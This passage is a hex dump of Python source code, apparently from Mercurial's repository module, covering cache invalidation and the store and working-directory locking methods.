+0001a5a0: 6620 796f 7520 7761 6e74 2074 6f0a 2020  f you want to.  
+0001a5b0: 2020 2020 2020 6578 706c 6963 6974 6c79        explicitly
+0001a5c0: 2072 6561 6420 7468 6520 6469 7273 7461   read the dirsta
+0001a5d0: 7465 2061 6761 696e 2028 692e 652e 2072  te again (i.e. r
+0001a5e0: 6573 746f 7269 6e67 2069 7420 746f 2061  estoring it to a
+0001a5f0: 2070 7265 7669 6f75 730a 2020 2020 2020   previous.      
+0001a600: 2020 6b6e 6f77 6e20 676f 6f64 2073 7461    known good sta
+0001a610: 7465 292e 2222 220a 2020 2020 2020 2020  te).""".        
+0001a620: 756e 6669 203d 2073 656c 662e 756e 6669  unfi = self.unfi
+0001a630: 6c74 6572 6564 2829 0a20 2020 2020 2020  ltered().       
+0001a640: 2069 6620 2764 6972 7374 6174 6527 2069   if 'dirstate' i
+0001a650: 6e20 756e 6669 2e5f 5f64 6963 745f 5f3a  n unfi.__dict__:
+0001a660: 0a20 2020 2020 2020 2020 2020 2064 656c  .            del
+0001a670: 2075 6e66 692e 5f5f 6469 6374 5f5f 5b27   unfi.__dict__['
+0001a680: 6469 7273 7461 7465 275d 0a0a 2020 2020  dirstate']..    
+0001a690: 6465 6620 696e 7661 6c69 6461 7465 2873  def invalidate(s
+0001a6a0: 656c 662c 2063 6c65 6172 6669 6c65 6361  elf, clearfileca
+0001a6b0: 6368 653d 4661 6c73 6529 3a0a 2020 2020  che=False):.    
+0001a6c0: 2020 2020 2222 2249 6e76 616c 6964 6174      """Invalidat
+0001a6d0: 6573 2062 6f74 6820 7374 6f72 6520 616e  es both store an
+0001a6e0: 6420 6e6f 6e2d 7374 6f72 6520 7061 7274  d non-store part
+0001a6f0: 7320 6f74 6865 7220 7468 616e 2064 6972  s other than dir
+0001a700: 7374 6174 650a 0a20 2020 2020 2020 2049  state..        I
+0001a710: 6620 6120 7472 616e 7361 6374 696f 6e20  f a transaction 
+0001a720: 6973 2072 756e 6e69 6e67 2c20 696e 7661  is running, inva
+0001a730: 6c69 6461 7469 6f6e 206f 6620 7374 6f72  lidation of stor
+0001a740: 6520 6973 206f 6d69 7474 6564 2c0a 2020  e is omitted,.  
+0001a750: 2020 2020 2020 6265 6361 7573 6520 6469        because di
+0001a760: 7363 6172 6469 6e67 2069 6e2d 6d65 6d6f  scarding in-memo
+0001a770: 7279 2063 6861 6e67 6573 206d 6967 6874  ry changes might
+0001a780: 2063 6175 7365 2069 6e63 6f6e 7369 7374   cause inconsist
+0001a790: 656e 6379 0a20 2020 2020 2020 2028 652e  ency.        (e.
+0001a7a0: 672e 2069 6e63 6f6d 706c 6574 6520 666e  g. incomplete fn
+0001a7b0: 6361 6368 6520 6361 7573 6573 2075 6e69  cache causes uni
+0001a7c0: 6e74 656e 7469 6f6e 616c 2066 6169 6c75  ntentional failu
+0001a7d0: 7265 2c20 6275 740a 2020 2020 2020 2020  re, but.        
+0001a7e0: 7265 6475 6e64 616e 7420 6f6e 6520 646f  redundant one do
+0001a7f0: 6573 6e27 7429 2e0a 2020 2020 2020 2020  esn't)..        
+0001a800: 2222 220a 2020 2020 2020 2020 756e 6669  """.        unfi
+0001a810: 6c74 6572 6564 203d 2073 656c 662e 756e  ltered = self.un
+0001a820: 6669 6c74 6572 6564 2829 2020 2320 616c  filtered()  # al
+0001a830: 6c20 6669 6c65 2063 6163 6865 7320 6172  l file caches ar
+0001a840: 6520 7374 6f72 6564 2075 6e66 696c 7465  e stored unfilte
+0001a850: 7265 640a 2020 2020 2020 2020 666f 7220  red.        for 
+0001a860: 6b20 696e 206c 6973 7428 7365 6c66 2e5f  k in list(self._
+0001a870: 6669 6c65 6361 6368 652e 6b65 7973 2829  filecache.keys()
+0001a880: 293a 0a20 2020 2020 2020 2020 2020 2069  ):.            i
+0001a890: 6620 280a 2020 2020 2020 2020 2020 2020  f (.            
+0001a8a0: 2020 2020 6b20 3d3d 2062 2763 6861 6e67      k == b'chang
+0001a8b0: 656c 6f67 270a 2020 2020 2020 2020 2020  elog'.          
+0001a8c0: 2020 2020 2020 616e 6420 7365 6c66 2e63        and self.c
+0001a8d0: 7572 7265 6e74 7472 616e 7361 6374 696f  urrenttransactio
+0001a8e0: 6e28 290a 2020 2020 2020 2020 2020 2020  n().            
+0001a8f0: 2020 2020 616e 6420 7365 6c66 2e63 6861      and self.cha
+0001a900: 6e67 656c 6f67 2e5f 6465 6c61 7965 640a  ngelog._delayed.
+0001a910: 2020 2020 2020 2020 2020 2020 293a 0a20              ):. 
+0001a920: 2020 2020 2020 2020 2020 2020 2020 2023                 #
+0001a930: 2054 6865 2063 6861 6e67 656c 6f67 206f   The changelog o
+0001a940: 626a 6563 7420 6d61 7920 7374 6f72 6520  bject may store 
+0001a950: 756e 7772 6974 7465 6e20 7265 7669 7369  unwritten revisi
+0001a960: 6f6e 732e 2057 6520 646f 6e27 740a 2020  ons. We don't.  
+0001a970: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+0001a980: 7761 6e74 2074 6f20 6c6f 7365 2074 6865  want to lose the
+0001a990: 6d2e 0a20 2020 2020 2020 2020 2020 2020  m..             
+0001a9a0: 2020 2023 2054 4f44 4f3a 2053 6f6c 7665     # TODO: Solve
+0001a9b0: 2074 6865 2070 726f 626c 656d 2069 6e73   the problem ins
+0001a9c0: 7465 6164 206f 6620 776f 726b 696e 6720  tead of working 
+0001a9d0: 6172 6f75 6e64 2069 742e 0a20 2020 2020  around it..     
+0001a9e0: 2020 2020 2020 2020 2020 2063 6f6e 7469             conti
+0001a9f0: 6e75 650a 0a20 2020 2020 2020 2020 2020  nue..           
+0001aa00: 2069 6620 636c 6561 7266 696c 6563 6163   if clearfilecac
+0001aa10: 6865 3a0a 2020 2020 2020 2020 2020 2020  he:.            
+0001aa20: 2020 2020 6465 6c20 7365 6c66 2e5f 6669      del self._fi
+0001aa30: 6c65 6361 6368 655b 6b5d 0a20 2020 2020  lecache[k].     
+0001aa40: 2020 2020 2020 2074 7279 3a0a 2020 2020         try:.    
+0001aa50: 2020 2020 2020 2020 2020 2020 6465 6c61              dela
+0001aa60: 7474 7228 756e 6669 6c74 6572 6564 2c20  ttr(unfiltered, 
+0001aa70: 6b29 0a20 2020 2020 2020 2020 2020 2065  k).            e
+0001aa80: 7863 6570 7420 4174 7472 6962 7574 6545  xcept AttributeE
+0001aa90: 7272 6f72 3a0a 2020 2020 2020 2020 2020  rror:.          
+0001aaa0: 2020 2020 2020 7061 7373 0a20 2020 2020        pass.     
+0001aab0: 2020 2073 656c 662e 696e 7661 6c69 6461     self.invalida
+0001aac0: 7465 6361 6368 6573 2829 0a20 2020 2020  tecaches().     
+0001aad0: 2020 2069 6620 6e6f 7420 7365 6c66 2e63     if not self.c
+0001aae0: 7572 7265 6e74 7472 616e 7361 6374 696f  urrenttransactio
+0001aaf0: 6e28 293a 0a20 2020 2020 2020 2020 2020  n():.           
+0001ab00: 2023 2054 4f44 4f3a 2043 6861 6e67 696e   # TODO: Changin
+0001ab10: 6720 636f 6e74 656e 7473 206f 6620 7374  g contents of st
+0001ab20: 6f72 6520 6f75 7473 6964 6520 7472 616e  ore outside tran
+0001ab30: 7361 6374 696f 6e0a 2020 2020 2020 2020  saction.        
+0001ab40: 2020 2020 2320 6361 7573 6573 2069 6e63      # causes inc
+0001ab50: 6f6e 7369 7374 656e 6379 2e20 5765 2073  onsistency. We s
+0001ab60: 686f 756c 6420 6d61 6b65 2069 6e2d 6d65  hould make in-me
+0001ab70: 6d6f 7279 2073 746f 7265 0a20 2020 2020  mory store.     
+0001ab80: 2020 2020 2020 2023 2063 6861 6e67 6573         # changes
+0001ab90: 2064 6574 6563 7461 626c 652c 2061 6e64   detectable, and
+0001aba0: 2061 626f 7274 2069 6620 6368 616e 6765   abort if change
+0001abb0: 642e 0a20 2020 2020 2020 2020 2020 2073  d..            s
+0001abc0: 656c 662e 7374 6f72 652e 696e 7661 6c69  elf.store.invali
+0001abd0: 6461 7465 6361 6368 6573 2829 0a0a 2020  datecaches()..  
+0001abe0: 2020 6465 6620 696e 7661 6c69 6461 7465    def invalidate
+0001abf0: 616c 6c28 7365 6c66 293a 0a20 2020 2020  all(self):.     
+0001ac00: 2020 2022 2222 4675 6c6c 7920 696e 7661     """Fully inva
+0001ac10: 6c69 6461 7465 7320 626f 7468 2073 746f  lidates both sto
+0001ac20: 7265 2061 6e64 206e 6f6e 2d73 746f 7265  re and non-store
+0001ac30: 2070 6172 7473 2c20 6361 7573 696e 6720   parts, causing 
+0001ac40: 7468 650a 2020 2020 2020 2020 7375 6273  the.        subs
+0001ac50: 6571 7565 6e74 206f 7065 7261 7469 6f6e  equent operation
+0001ac60: 2074 6f20 7265 7265 6164 2061 6e79 206f   to reread any o
+0001ac70: 7574 7369 6465 2063 6861 6e67 6573 2e22  utside changes."
+0001ac80: 2222 0a20 2020 2020 2020 2023 2065 7874  "".        # ext
+0001ac90: 656e 7369 6f6e 2073 686f 756c 6420 686f  ension should ho
+0001aca0: 6f6b 2074 6869 7320 746f 2069 6e76 616c  ok this to inval
+0001acb0: 6964 6174 6520 6974 7320 6361 6368 6573  idate its caches
+0001acc0: 0a20 2020 2020 2020 2073 656c 662e 696e  .        self.in
+0001acd0: 7661 6c69 6461 7465 2829 0a20 2020 2020  validate().     
+0001ace0: 2020 2073 656c 662e 696e 7661 6c69 6461     self.invalida
+0001acf0: 7465 6469 7273 7461 7465 2829 0a0a 2020  tedirstate()..  
+0001ad00: 2020 4075 6e66 696c 7465 7265 646d 6574    @unfilteredmet
+0001ad10: 686f 640a 2020 2020 6465 6620 5f72 6566  hod.    def _ref
+0001ad20: 7265 7368 6669 6c65 6361 6368 6573 7461  reshfilecachesta
+0001ad30: 7473 2873 656c 662c 2074 7229 3a0a 2020  ts(self, tr):.  
+0001ad40: 2020 2020 2020 2222 2252 656c 6f61 6420        """Reload 
+0001ad50: 7374 6174 7320 6f66 2063 6163 6865 6420  stats of cached 
+0001ad60: 6669 6c65 7320 736f 2074 6861 7420 7468  files so that th
+0001ad70: 6579 2061 7265 2066 6c61 6767 6564 2061  ey are flagged a
+0001ad80: 7320 7661 6c69 6422 2222 0a20 2020 2020  s valid""".     
+0001ad90: 2020 2066 6f72 206b 2c20 6365 2069 6e20     for k, ce in 
+0001ada0: 7365 6c66 2e5f 6669 6c65 6361 6368 652e  self._filecache.
+0001adb0: 6974 656d 7328 293a 0a20 2020 2020 2020  items():.       
+0001adc0: 2020 2020 206b 203d 2070 7963 6f6d 7061       k = pycompa
+0001add0: 742e 7379 7373 7472 286b 290a 2020 2020  t.sysstr(k).    
+0001ade0: 2020 2020 2020 2020 6966 206b 203d 3d20          if k == 
+0001adf0: 2764 6972 7374 6174 6527 206f 7220 6b20  'dirstate' or k 
+0001ae00: 6e6f 7420 696e 2073 656c 662e 5f5f 6469  not in self.__di
+0001ae10: 6374 5f5f 3a0a 2020 2020 2020 2020 2020  ct__:.          
+0001ae20: 2020 2020 2020 636f 6e74 696e 7565 0a20        continue. 
+0001ae30: 2020 2020 2020 2020 2020 2063 652e 7265             ce.re
+0001ae40: 6672 6573 6828 290a 0a20 2020 2064 6566  fresh()..    def
+0001ae50: 205f 6c6f 636b 280a 2020 2020 2020 2020   _lock(.        
+0001ae60: 7365 6c66 2c0a 2020 2020 2020 2020 7666  self,.        vf
+0001ae70: 732c 0a20 2020 2020 2020 206c 6f63 6b6e  s,.        lockn
+0001ae80: 616d 652c 0a20 2020 2020 2020 2077 6169  ame,.        wai
+0001ae90: 742c 0a20 2020 2020 2020 2072 656c 6561  t,.        relea
+0001aea0: 7365 666e 2c0a 2020 2020 2020 2020 6163  sefn,.        ac
+0001aeb0: 7175 6972 6566 6e2c 0a20 2020 2020 2020  quirefn,.       
+0001aec0: 2064 6573 632c 0a20 2020 2029 3a0a 2020   desc,.    ):.  
+0001aed0: 2020 2020 2020 7469 6d65 6f75 7420 3d20        timeout = 
+0001aee0: 300a 2020 2020 2020 2020 7761 726e 7469  0.        warnti
+0001aef0: 6d65 6f75 7420 3d20 300a 2020 2020 2020  meout = 0.      
+0001af00: 2020 6966 2077 6169 743a 0a20 2020 2020    if wait:.     
+0001af10: 2020 2020 2020 2074 696d 656f 7574 203d         timeout =
+0001af20: 2073 656c 662e 7569 2e63 6f6e 6669 6769   self.ui.configi
+0001af30: 6e74 2862 2275 6922 2c20 6222 7469 6d65  nt(b"ui", b"time
+0001af40: 6f75 7422 290a 2020 2020 2020 2020 2020  out").          
+0001af50: 2020 7761 726e 7469 6d65 6f75 7420 3d20    warntimeout = 
+0001af60: 7365 6c66 2e75 692e 636f 6e66 6967 696e  self.ui.configin
+0001af70: 7428 6222 7569 222c 2062 2274 696d 656f  t(b"ui", b"timeo
+0001af80: 7574 2e77 6172 6e22 290a 2020 2020 2020  ut.warn").      
+0001af90: 2020 2320 696e 7465 726e 616c 2063 6f6e    # internal con
+0001afa0: 6669 673a 2075 692e 7369 676e 616c 2d73  fig: ui.signal-s
+0001afb0: 6166 652d 6c6f 636b 0a20 2020 2020 2020  afe-lock.       
+0001afc0: 2073 6967 6e61 6c73 6166 6520 3d20 7365   signalsafe = se
+0001afd0: 6c66 2e75 692e 636f 6e66 6967 626f 6f6c  lf.ui.configbool
+0001afe0: 2862 2775 6927 2c20 6227 7369 676e 616c  (b'ui', b'signal
+0001aff0: 2d73 6166 652d 6c6f 636b 2729 0a0a 2020  -safe-lock')..  
+0001b000: 2020 2020 2020 6c20 3d20 6c6f 636b 6d6f        l = lockmo
+0001b010: 642e 7472 796c 6f63 6b28 0a20 2020 2020  d.trylock(.     
+0001b020: 2020 2020 2020 2073 656c 662e 7569 2c0a         self.ui,.
+0001b030: 2020 2020 2020 2020 2020 2020 7666 732c              vfs,
+0001b040: 0a20 2020 2020 2020 2020 2020 206c 6f63  .            loc
+0001b050: 6b6e 616d 652c 0a20 2020 2020 2020 2020  kname,.         
+0001b060: 2020 2074 696d 656f 7574 2c0a 2020 2020     timeout,.    
+0001b070: 2020 2020 2020 2020 7761 726e 7469 6d65          warntime
+0001b080: 6f75 742c 0a20 2020 2020 2020 2020 2020  out,.           
+0001b090: 2072 656c 6561 7365 666e 3d72 656c 6561   releasefn=relea
+0001b0a0: 7365 666e 2c0a 2020 2020 2020 2020 2020  sefn,.          
+0001b0b0: 2020 6163 7175 6972 6566 6e3d 6163 7175    acquirefn=acqu
+0001b0c0: 6972 6566 6e2c 0a20 2020 2020 2020 2020  irefn,.         
+0001b0d0: 2020 2064 6573 633d 6465 7363 2c0a 2020     desc=desc,.  
+0001b0e0: 2020 2020 2020 2020 2020 7369 676e 616c            signal
+0001b0f0: 7361 6665 3d73 6967 6e61 6c73 6166 652c  safe=signalsafe,
+0001b100: 0a20 2020 2020 2020 2029 0a20 2020 2020  .        ).     
+0001b110: 2020 2072 6574 7572 6e20 6c0a 0a20 2020     return l..   
+0001b120: 2064 6566 205f 6166 7465 726c 6f63 6b28   def _afterlock(
+0001b130: 7365 6c66 2c20 6361 6c6c 6261 636b 293a  self, callback):
+0001b140: 0a20 2020 2020 2020 2022 2222 6164 6420  .        """add 
+0001b150: 6120 6361 6c6c 6261 636b 2074 6f20 6265  a callback to be
+0001b160: 2072 756e 2077 6865 6e20 7468 6520 7265   run when the re
+0001b170: 706f 7369 746f 7279 2069 7320 6675 6c6c  pository is full
+0001b180: 7920 756e 6c6f 636b 6564 0a0a 2020 2020  y unlocked..    
+0001b190: 2020 2020 5468 6520 6361 6c6c 6261 636b      The callback
+0001b1a0: 2077 696c 6c20 6265 2065 7865 6375 7465   will be execute
+0001b1b0: 6420 7768 656e 2074 6865 206f 7574 6572  d when the outer
+0001b1c0: 6d6f 7374 206c 6f63 6b20 6973 2072 656c  most lock is rel
+0001b1d0: 6561 7365 640a 2020 2020 2020 2020 2877  eased.        (w
+0001b1e0: 6974 6820 776c 6f63 6b20 6265 696e 6720  ith wlock being 
+0001b1f0: 6869 6768 6572 206c 6576 656c 2074 6861  higher level tha
+0001b200: 6e20 276c 6f63 6b27 292e 2222 220a 2020  n 'lock').""".  
+0001b210: 2020 2020 2020 666f 7220 7265 6620 696e        for ref in
+0001b220: 2028 7365 6c66 2e5f 776c 6f63 6b72 6566   (self._wlockref
+0001b230: 2c20 7365 6c66 2e5f 6c6f 636b 7265 6629  , self._lockref)
+0001b240: 3a0a 2020 2020 2020 2020 2020 2020 6c20  :.            l 
+0001b250: 3d20 7265 6620 616e 6420 7265 6628 290a  = ref and ref().
+0001b260: 2020 2020 2020 2020 2020 2020 6966 206c              if l
+0001b270: 2061 6e64 206c 2e68 656c 643a 0a20 2020   and l.held:.   
+0001b280: 2020 2020 2020 2020 2020 2020 206c 2e70               l.p
+0001b290: 6f73 7472 656c 6561 7365 2e61 7070 656e  ostrelease.appen
+0001b2a0: 6428 6361 6c6c 6261 636b 290a 2020 2020  d(callback).    
+0001b2b0: 2020 2020 2020 2020 2020 2020 6272 6561              brea
+0001b2c0: 6b0a 2020 2020 2020 2020 656c 7365 3a20  k.        else: 
+0001b2d0: 2023 206e 6f20 6c6f 636b 2068 6176 6520   # no lock have 
+0001b2e0: 6265 656e 2066 6f75 6e64 2e0a 2020 2020  been found..    
+0001b2f0: 2020 2020 2020 2020 6361 6c6c 6261 636b          callback
+0001b300: 2854 7275 6529 0a0a 2020 2020 6465 6620  (True)..    def 
+0001b310: 6c6f 636b 2873 656c 662c 2077 6169 743d  lock(self, wait=
+0001b320: 5472 7565 293a 0a20 2020 2020 2020 2022  True):.        "
+0001b330: 2222 4c6f 636b 2074 6865 2072 6570 6f73  ""Lock the repos
+0001b340: 6974 6f72 7920 7374 6f72 6520 282e 6867  itory store (.hg
+0001b350: 2f73 746f 7265 2920 616e 6420 7265 7475  /store) and retu
+0001b360: 726e 2061 2077 6561 6b20 7265 6665 7265  rn a weak refere
+0001b370: 6e63 650a 2020 2020 2020 2020 746f 2074  nce.        to t
+0001b380: 6865 206c 6f63 6b2e 2055 7365 2074 6869  he lock. Use thi
+0001b390: 7320 6265 666f 7265 206d 6f64 6966 7969  s before modifyi
+0001b3a0: 6e67 2074 6865 2073 746f 7265 2028 652e  ng the store (e.
+0001b3b0: 672e 2063 6f6d 6d69 7474 696e 6720 6f72  g. committing or
+0001b3c0: 0a20 2020 2020 2020 2073 7472 6970 7069  .        strippi
+0001b3d0: 6e67 292e 2049 6620 796f 7520 6172 6520  ng). If you are 
+0001b3e0: 6f70 656e 696e 6720 6120 7472 616e 7361  opening a transa
+0001b3f0: 6374 696f 6e2c 2067 6574 2061 206c 6f63  ction, get a loc
+0001b400: 6b20 6173 2077 656c 6c2e 290a 0a20 2020  k as well.)..   
+0001b410: 2020 2020 2049 6620 626f 7468 2027 6c6f       If both 'lo
+0001b420: 636b 2720 616e 6420 2777 6c6f 636b 2720  ck' and 'wlock' 
+0001b430: 6d75 7374 2062 6520 6163 7175 6972 6564  must be acquired
+0001b440: 2c20 656e 7375 7265 2079 6f75 2061 6c77  , ensure you alw
+0001b450: 6179 7320 6163 7175 6972 6573 0a20 2020  ays acquires.   
+0001b460: 2020 2020 2027 776c 6f63 6b27 2066 6972       'wlock' fir
+0001b470: 7374 2074 6f20 6176 6f69 6420 6120 6465  st to avoid a de
+0001b480: 6164 2d6c 6f63 6b20 6861 7a61 7264 2e22  ad-lock hazard."
+0001b490: 2222 0a20 2020 2020 2020 206c 203d 2073  "".        l = s
+0001b4a0: 656c 662e 5f63 7572 7265 6e74 6c6f 636b  elf._currentlock
+0001b4b0: 2873 656c 662e 5f6c 6f63 6b72 6566 290a  (self._lockref).
+0001b4c0: 2020 2020 2020 2020 6966 206c 2069 7320          if l is 
+0001b4d0: 6e6f 7420 4e6f 6e65 3a0a 2020 2020 2020  not None:.      
+0001b4e0: 2020 2020 2020 6c2e 6c6f 636b 2829 0a20        l.lock(). 
+0001b4f0: 2020 2020 2020 2020 2020 2072 6574 7572             retur
+0001b500: 6e20 6c0a 0a20 2020 2020 2020 206c 203d  n l..        l =
+0001b510: 2073 656c 662e 5f6c 6f63 6b28 0a20 2020   self._lock(.   
+0001b520: 2020 2020 2020 2020 2076 6673 3d73 656c           vfs=sel
+0001b530: 662e 7376 6673 2c0a 2020 2020 2020 2020  f.svfs,.        
+0001b540: 2020 2020 6c6f 636b 6e61 6d65 3d62 226c      lockname=b"l
+0001b550: 6f63 6b22 2c0a 2020 2020 2020 2020 2020  ock",.          
+0001b560: 2020 7761 6974 3d77 6169 742c 0a20 2020    wait=wait,.   
+0001b570: 2020 2020 2020 2020 2072 656c 6561 7365           release
+0001b580: 666e 3d4e 6f6e 652c 0a20 2020 2020 2020  fn=None,.       
+0001b590: 2020 2020 2061 6371 7569 7265 666e 3d73       acquirefn=s
+0001b5a0: 656c 662e 696e 7661 6c69 6461 7465 2c0a  elf.invalidate,.
+0001b5b0: 2020 2020 2020 2020 2020 2020 6465 7363              desc
+0001b5c0: 3d5f 2862 2772 6570 6f73 6974 6f72 7920  =_(b'repository 
+0001b5d0: 2573 2729 2025 2073 656c 662e 6f72 6967  %s') % self.orig
+0001b5e0: 726f 6f74 2c0a 2020 2020 2020 2020 290a  root,.        ).
+0001b5f0: 2020 2020 2020 2020 7365 6c66 2e5f 6c6f          self._lo
+0001b600: 636b 7265 6620 3d20 7765 616b 7265 662e  ckref = weakref.
+0001b610: 7265 6628 6c29 0a20 2020 2020 2020 2072  ref(l).        r
+0001b620: 6574 7572 6e20 6c0a 0a20 2020 2064 6566  eturn l..    def
+0001b630: 2077 6c6f 636b 2873 656c 662c 2077 6169   wlock(self, wai
+0001b640: 743d 5472 7565 293a 0a20 2020 2020 2020  t=True):.       
+0001b650: 2022 2222 4c6f 636b 2074 6865 206e 6f6e   """Lock the non
+0001b660: 2d73 746f 7265 2070 6172 7473 206f 6620  -store parts of 
+0001b670: 7468 6520 7265 706f 7369 746f 7279 2028  the repository (
+0001b680: 6576 6572 7974 6869 6e67 2075 6e64 6572  everything under
+0001b690: 0a20 2020 2020 2020 202e 6867 2065 7863  .        .hg exc
+0001b6a0: 6570 7420 2e68 672f 7374 6f72 6529 2061  ept .hg/store) a
+0001b6b0: 6e64 2072 6574 7572 6e20 6120 7765 616b  nd return a weak
+0001b6c0: 2072 6566 6572 656e 6365 2074 6f20 7468   reference to th
+0001b6d0: 6520 6c6f 636b 2e0a 0a20 2020 2020 2020  e lock...       
+0001b6e0: 2055 7365 2074 6869 7320 6265 666f 7265   Use this before
+0001b6f0: 206d 6f64 6966 7969 6e67 2066 696c 6573   modifying files
+0001b700: 2069 6e20 2e68 672e 0a0a 2020 2020 2020   in .hg...      
+0001b710: 2020 4966 2062 6f74 6820 276c 6f63 6b27    If both 'lock'
+0001b720: 2061 6e64 2027 776c 6f63 6b27 206d 7573   and 'wlock' mus
+0001b730: 7420 6265 2061 6371 7569 7265 642c 2065  t be acquired, e
+0001b740: 6e73 7572 6520 796f 7520 616c 7761 7973  nsure you always
+0001b750: 2061 6371 7569 7265 730a 2020 2020 2020   acquires.      
+0001b760: 2020 2777 6c6f 636b 2720 6669 7273 7420    'wlock' first 
+0001b770: 746f 2061 766f 6964 2061 2064 6561 642d  to avoid a dead-
+0001b780: 6c6f 636b 2068 617a 6172 642e 2222 220a  lock hazard.""".
+0001b790: 2020 2020 2020 2020 6c20 3d20 7365 6c66          l = self
+0001b7a0: 2e5f 776c 6f63 6b72 6566 2829 2069 6620  ._wlockref() if 
+0001b7b0: 7365 6c66 2e5f 776c 6f63 6b72 6566 2065  self._wlockref e
+0001b7c0: 6c73 6520 4e6f 6e65 0a20 2020 2020 2020  lse None.       
+0001b7d0: 2069 6620 6c20 6973 206e 6f74 204e 6f6e   if l is not Non
+0001b7e0: 6520 616e 6420 6c2e 6865 6c64 3a0a 2020  e and l.held:.  
+0001b7f0: 2020 2020 2020 2020 2020 6c2e 6c6f 636b            l.lock
+0001b800: 2829 0a20 2020 2020 2020 2020 2020 2072  ().            r
+0001b810: 6574 7572 6e20 6c0a 0a20 2020 2020 2020  eturn l..       
+0001b820: 2023 2057 6520 646f 206e 6f74 206e 6565   # We do not nee
+0001b830: 6420 746f 2063 6865 636b 2066 6f72 206e  d to check for n
+0001b840: 6f6e 2d77 6169 7469 6e67 206c 6f63 6b20  on-waiting lock 
+0001b850: 6163 7175 6973 6974 696f 6e2e 2020 5375  acquisition.  Su
+0001b860: 6368 0a20 2020 2020 2020 2023 2061 6371  ch.        # acq
+0001b870: 7569 7369 7469 6f6e 2077 6f75 6c64 206e  uisition would n
+0001b880: 6f74 2063 6175 7365 2064 6561 642d 6c6f  ot cause dead-lo
+0001b890: 636b 2061 7320 7468 6579 2077 6f75 6c64  ck as they would
+0001b8a0: 206a 7573 7420 6661 696c 2e0a 2020 2020   just fail..    
+0001b8b0: 2020 2020 6966 2077 6169 7420 616e 6420      if wait and 
+0001b8c0: 280a 2020 2020 2020 2020 2020 2020 7365  (.            se
+0001b8d0: 6c66 2e75 692e 636f 6e66 6967 626f 6f6c  lf.ui.configbool
+0001b8e0: 2862 2764 6576 656c 272c 2062 2761 6c6c  (b'devel', b'all
+0001b8f0: 2d77 6172 6e69 6e67 7327 290a 2020 2020  -warnings').    
+0001b900: 2020 2020 2020 2020 6f72 2073 656c 662e          or self.
+0001b910: 7569 2e63 6f6e 6669 6762 6f6f 6c28 6227  ui.configbool(b'
+0001b920: 6465 7665 6c27 2c20 6227 6368 6563 6b2d  devel', b'check-
+0001b930: 6c6f 636b 7327 290a 2020 2020 2020 2020  locks').        
+0001b940: 293a 0a20 2020 2020 2020 2020 2020 2069  ):.            i
+0001b950: 6620 7365 6c66 2e5f 6375 7272 656e 746c  f self._currentl
+0001b960: 6f63 6b28 7365 6c66 2e5f 6c6f 636b 7265  ock(self._lockre
+0001b970: 6629 2069 7320 6e6f 7420 4e6f 6e65 3a0a  f) is not None:.
+0001b980: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001b990: 7365 6c66 2e75 692e 6465 7665 6c77 6172  self.ui.develwar
+0001b9a0: 6e28 6227 2277 6c6f 636b 2220 6163 7175  n(b'"wlock" acqu
+0001b9b0: 6972 6564 2061 6674 6572 2022 6c6f 636b  ired after "lock
+0001b9c0: 2227 290a 0a20 2020 2020 2020 2064 6566  "')..        def
+0001b9d0: 2075 6e6c 6f63 6b28 293a 0a20 2020 2020   unlock():.     
+0001b9e0: 2020 2020 2020 2069 6620 7365 6c66 2e64         if self.d
+0001b9f0: 6972 7374 6174 652e 6973 5f63 6861 6e67  irstate.is_chang
+0001ba00: 696e 675f 616e 793a 0a20 2020 2020 2020  ing_any:.       
+0001ba10: 2020 2020 2020 2020 206d 7367 203d 2062           msg = b
+0001ba20: 2277 6c6f 636b 2072 656c 6561 7365 2069  "wlock release i
+0001ba30: 6e20 7468 6520 6d69 6464 6c65 206f 6620  n the middle of 
+0001ba40: 6120 6368 616e 6769 6e67 2070 6172 656e  a changing paren
+0001ba50: 7473 220a 2020 2020 2020 2020 2020 2020  ts".            
+0001ba60: 2020 2020 7365 6c66 2e75 692e 6465 7665      self.ui.deve
+0001ba70: 6c77 6172 6e28 6d73 6729 0a20 2020 2020  lwarn(msg).     
+0001ba80: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+0001ba90: 6469 7273 7461 7465 2e69 6e76 616c 6964  dirstate.invalid
+0001baa0: 6174 6528 290a 2020 2020 2020 2020 2020  ate().          
+0001bab0: 2020 656c 7365 3a0a 2020 2020 2020 2020    else:.        
+0001bac0: 2020 2020 2020 2020 6966 2073 656c 662e          if self.
+0001bad0: 6469 7273 7461 7465 2e5f 6469 7274 793a  dirstate._dirty:
+0001bae0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+0001baf0: 2020 2020 206d 7367 203d 2062 2264 6972       msg = b"dir
+0001bb00: 7479 2064 6972 7374 6174 6520 6f6e 2077  ty dirstate on w
+0001bb10: 6c6f 636b 2072 656c 6561 7365 220a 2020  lock release".  
+0001bb20: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001bb30: 2020 7365 6c66 2e75 692e 6465 7665 6c77    self.ui.develw
+0001bb40: 6172 6e28 6d73 6729 0a20 2020 2020 2020  arn(msg).       
+0001bb50: 2020 2020 2020 2020 2073 656c 662e 6469           self.di
+0001bb60: 7273 7461 7465 2e77 7269 7465 284e 6f6e  rstate.write(Non
+0001bb70: 6529 0a0a 2020 2020 2020 2020 2020 2020  e)..            
+0001bb80: 756e 6669 203d 2073 656c 662e 756e 6669  unfi = self.unfi
+0001bb90: 6c74 6572 6564 2829 0a20 2020 2020 2020  ltered().       
+0001bba0: 2020 2020 2069 6620 2764 6972 7374 6174       if 'dirstat
+0001bbb0: 6527 2069 6e20 756e 6669 2e5f 5f64 6963  e' in unfi.__dic
+0001bbc0: 745f 5f3a 0a20 2020 2020 2020 2020 2020  t__:.           
+0001bbd0: 2020 2020 2064 656c 2075 6e66 692e 5f5f       del unfi.__
+0001bbe0: 6469 6374 5f5f 5b27 6469 7273 7461 7465  dict__['dirstate
+0001bbf0: 275d 0a0a 2020 2020 2020 2020 6c20 3d20  ']..        l = 
+0001bc00: 7365 6c66 2e5f 6c6f 636b 280a 2020 2020  self._lock(.    
+0001bc10: 2020 2020 2020 2020 7365 6c66 2e76 6673          self.vfs
+0001bc20: 2c0a 2020 2020 2020 2020 2020 2020 6222  ,.            b"
+0001bc30: 776c 6f63 6b22 2c0a 2020 2020 2020 2020  wlock",.        
+0001bc40: 2020 2020 7761 6974 2c0a 2020 2020 2020      wait,.      
+0001bc50: 2020 2020 2020 756e 6c6f 636b 2c0a 2020        unlock,.  
+0001bc60: 2020 2020 2020 2020 2020 7365 6c66 2e69            self.i
+0001bc70: 6e76 616c 6964 6174 6564 6972 7374 6174  nvalidatedirstat
